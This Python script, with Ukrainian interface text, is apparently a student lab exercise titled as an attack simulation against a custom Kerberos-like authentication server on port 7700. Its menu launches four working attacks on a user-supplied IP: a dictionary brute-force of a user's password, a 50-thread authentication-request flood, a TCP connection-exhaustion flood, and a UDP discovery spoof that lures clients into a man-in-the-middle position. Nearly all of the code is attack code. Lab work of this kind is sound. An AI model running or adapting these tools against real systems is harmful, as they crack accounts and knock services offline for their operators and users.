import socket
import sys
import threading
import time
import random
import time

SHIFT_KEY = 7
PORT = 7700
RESOURCE_ID = "FILESERVER_B"

def crc16_hash(text: str) -> str:
    data = text.encode('utf-8')
    crc = 0xFFFF
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc = crc << 1
            crc &= 0xFFFF
    return f"{crc:04X}"

def decrypt_shift(text: str) -> str:
    result = []
    for char in text:
        shifted = (ord(char) - SHIFT_KEY) % 0x110000
        result.append(chr(shifted))
    return "".join(result)

def encrypt_shift(text: str) -> str:
    result = []
    for char in text:
        shifted = (ord(char) + SHIFT_KEY) % 0x110000
        result.append(chr(shifted))
    return "".join(result)

def encrypt_keyed(text: str, key: str) -> str:
    if not key:
        key = "0"
    chunks = []
    for i, char in enumerate(text):
        k = ord(key[i % len(key)])
        shifted = (ord(char) + k) % 0x110000
        chunks.append(f"{shifted:06x}")
    return "".join(chunks)

def decrypt_keyed(text: str, key: str) -> str:
    if not key: key = "0"
    chars = []
    idx = 0
    for pos in range(0, len(text), 6):
        chunk = text[pos:pos + 6]
        code = int(chunk, 16)
        k = ord(key[idx % len(key)])
        original = (code - k) % 0x110000
        chars.append(chr(original))
        idx += 1
    return "".join(chars)

def send_tcp(conn: socket.socket, msg: str):
    encrypted = encrypt_shift(msg)
    conn.sendall(encrypted.encode('utf-8'))

def simulate_online_bruteforce(ip, user, dictionary_file):
    try:
        with open(dictionary_file, 'r', encoding='utf-8') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Помилка: Файл словника '{dictionary_file}' не знайдено.")
        return

    print(f"[*] Завантажено паролів для перевірки: {len(passwords)}")

    s = None
    attempts_in_session = 0

    for pwd in passwords:
        if s is None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3.0)
                s.connect((ip, PORT))
                attempts_in_session = 0
            except Exception as e:
                print(f"[-] Не вдалося підключитися до сервера: {e}")
                time.sleep(1)
                continue

        k_a = crc16_hash(pwd)
        r1 = random.randint(10 ** 5, 10 ** 6 - 1)
        inner1 = f"{r1}|{RESOURCE_ID}|CONNECT_B"
        enc1 = encrypt_keyed(inner1, k_a)
        payload = f"KDC_REQ|{user}|{enc1}"

        try:
            encrypted_payload = encrypt_shift(payload)
            s.sendall(encrypted_payload.encode('utf-8'))

            data = s.recv(8192)
            if not data:
                s.close()
                s = None
                continue

            response = decrypt_shift(data.decode('utf-8'))
            parts = response.split('|', 1)

            if parts[0] == "KDC_RES":
                print(f"[+] УСПІХ! Знайдено правильний пароль: '{pwd}' (Хеш: {k_a})")
                s.close()
                return

            elif parts[0] == "ERROR":
                print(f"[-] Спроба '{pwd}' -> невдало. ({parts[1].strip()})")
                attempts_in_session += 1

                if "Залишилось спроб: 0" in parts[1] or attempts_in_session >= 3:
                    s.close()
                    s = None

        except Exception as e:
            print(f"[-] Помилка під час обміну даними з сервером: {e}")
            if s:
                s.close()
            s = None

    print("[-] Перебір завершено. Жоден пароль зі словника не підійшов.")

def _dos_worker(server_ip, stop_event, stats, stats_lock):
    worker_id = threading.get_ident()
    counter = 0
    while not stop_event.is_set():
        counter += 1
        fake_user = f"GHOST_{worker_id}_{counter}_{random.randint(0, 999999)}"
        r1 = random.randint(10 ** 5, 10 ** 6 - 1)
        inner1 = f"{r1}|{RESOURCE_ID}|CONNECT_B"
        enc1 = encrypt_keyed(inner1, "0")
        payload = f"KDC_REQ|{fake_user}|{enc1}"

        start = time.monotonic()
        success = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((server_ip, PORT))
            send_tcp(s, payload)
            data = s.recv(8192)
            s.close()
            success = bool(data)
        except Exception:
            success = False
        elapsed = time.monotonic() - start

        with stats_lock:
            stats["sent"] += 1
            if success:
                stats["ok"] += 1
                stats["latencies"].append(elapsed)
                if len(stats["latencies"]) > 500:
                    stats["latencies"].pop(0)
            else:
                stats["failed"] += 1


def simulate_dos(server_ip: str, num_workers: int = 50):
    print(f"[*] Запуск DoS (флуд запитів на авторизацію) проти {server_ip}")
    print(f"[*] Паралельних потоків: {num_workers}")
    print("[*] Жоден реальний обліковий запис НЕ використовується і НЕ блокується.")
    print("[*] Натисніть Ctrl+C щоб зупинити атаку.\n")

    stop_event = threading.Event()
    stats = {"sent": 0, "ok": 0, "failed": 0, "latencies": []}
    stats_lock = threading.Lock()

    threads = []
    for _ in range(num_workers):
        t = threading.Thread(target=_dos_worker, args=(server_ip, stop_event, stats, stats_lock), daemon=True)
        t.start()
        threads.append(t)

    prev_sent = 0
    try:
        while True:
            time.sleep(1.0)
            with stats_lock:
                sent, ok, failed = stats["sent"], stats["ok"], stats["failed"]
                lat = stats["latencies"][-200:]
            rps = sent - prev_sent
            prev_sent = sent
            avg_latency_ms = (sum(lat) / len(lat) * 1000) if lat else 0.0
            fail_rate = (failed / sent * 100) if sent else 0.0
            print(f"[DoS] req/с: {rps:4d} | усього надіслано: {sent:6d} | "
                  f"успішних відповідей: {ok:6d} | відмов/таймаутів: {failed:6d} "
                  f"({fail_rate:5.1f}%) | середня затримка: {avg_latency_ms:6.1f} мс")
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[*] Атаку зупинено. Усього надіслано запитів: {stats['sent']}, "
              f"відмов/таймаутів: {stats['failed']}.")
        print("[*] Жоден обліковий запис на сервері не постраждав -- усі запити були для "
              "неіснуючих користувачів.")


def simulate_tcp_flood(server_ip):
    print(f"[*] Запуск TCP Flood на {server_ip}...")

    sockets = []
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, PORT))
            sockets.append(s)
            if len(sockets) % 50 == 0:
                print(f"[+] Відкрито з'єднань: {len(sockets)}")
    except Exception as e:
        print(
            f"[-] Сервер припинив приймати з'єднання (відмова в обслуговуванні досягнута). Відкрито сокетів: {len(sockets)}. Деталі: {e}")

def simulate_mitm():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_socket.bind(('', PORT))
    print(f"[*] Фальшивий UDP сервер прослуховує порт {PORT}...")

    while True:
        data, addr = udp_socket.recvfrom(1024)
        if data.decode('utf-8') == "DISCOVER":
            print(f"[!] Отримано DISCOVER від {addr}. Відправляємо фальшиву відповідь!")
            udp_socket.sendto(b"SERVER_HERE", addr)

            print(f"[*] Жертва {addr} тепер намагатиметься підключитися до цього IP по TCP.")

def main():
    while True:
        print("\n=== ЛАБОРАТОРНА РОБОТА №4: Імітація атак ===")
        print("1. Онлайн перебір паролів (Online Brute-Force)")
        print("2. Відмова в обслуговуванні (DoS)")
        print("3. Переповнення буфера з'єднань (TCP Flood)")
        print("4. Перехоплення сесії (UDP MitM)")
        print("0. Вихід")

        choice = input("\nОберіть тип атаки (0-4): ")

        if choice == '0':
            print("Вихід з програми.")
            sys.exit(0)

        elif choice == '1':
            ip = input("IP сервера: ")
            user = input("Користувач (наприклад, ADMIN): ")
            dict_file = input("Файл словника: ")
            simulate_online_bruteforce(ip, user, dict_file)

        elif choice == '2':
            ip = input("IP сервера: ")
            workers_raw = input("Кількість паралельних потоків [за замовчуванням 50]: ").strip()
            num_workers = int(workers_raw) if workers_raw.isdigit() else 50
            simulate_dos(ip, num_workers)

        elif choice == '3':
            ip = input("IP сервера: ")
            simulate_tcp_flood(ip)

        elif choice == '4':
            simulate_mitm()

        else:
            print("Невірний вибір, спробуйте ще раз.")


if __name__ == "__main__":
    main()
